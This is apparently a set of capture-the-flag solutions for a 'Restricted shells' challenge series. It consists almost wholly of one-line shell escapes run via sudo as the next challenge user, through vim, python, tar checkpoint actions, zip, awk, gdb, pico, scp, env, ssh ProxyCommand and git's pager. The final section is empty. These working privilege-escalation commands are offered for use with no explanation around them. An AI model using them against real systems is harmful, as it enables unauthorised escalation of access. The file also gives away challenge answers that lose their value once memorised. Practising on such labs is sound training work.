# Restricted shells

### ch14

```
$ vim
```
```
:set shell=/bin/bash
:shell
```

### ch14-1

```
sudo -u app-script-ch14-2 /usr/bin/python
>>> import os
>>> os.system('/bin/bash')
```

### ch14-2

```
$ sudo -u app-script-ch14-3 tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

### ch14-3

```
app-script-ch14-3@challenge02:/tmp/a$ TF=$(mktemp -u)
app-script-ch14-3@challenge02:/tmp/a$ sudo -u app-script-ch14-4 zip $TF /etc/hosts -T -TT 'sh #'
```

### ch14-4

```
$sudo -u app-script-ch14-5 awk 'BEGIN {system("/bin/bash")}'
```

### ch14-5

```
sudo -u app-script-ch14-6 /usr/bin/gdb -q -ex "set shell='/bin/bash'" /bin/ls
```

### ch14-6

```
pico
^R^X
reset; bash 1>&0 2>&0
```

### ch14-7

```
$TF=$(mktemp)
$echo 'sh 0<&2 1>&2' > $TF
$chmod +x "$TF"
$chmod 777 "$TF"
$sudo -u app-script-ch14-8 scp -S $TF x y:
```

### ch14-8
```
$sudo -u app-script-ch14-9 env /bin/bash
```

### ch14-9
```
$sudo -u app-script-ch14-10 ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

### ch14-10
```
$sudo -u app-script-ch14-11 git help config
```
```
!/bin/bash
```

###ch14-11

```

```
`
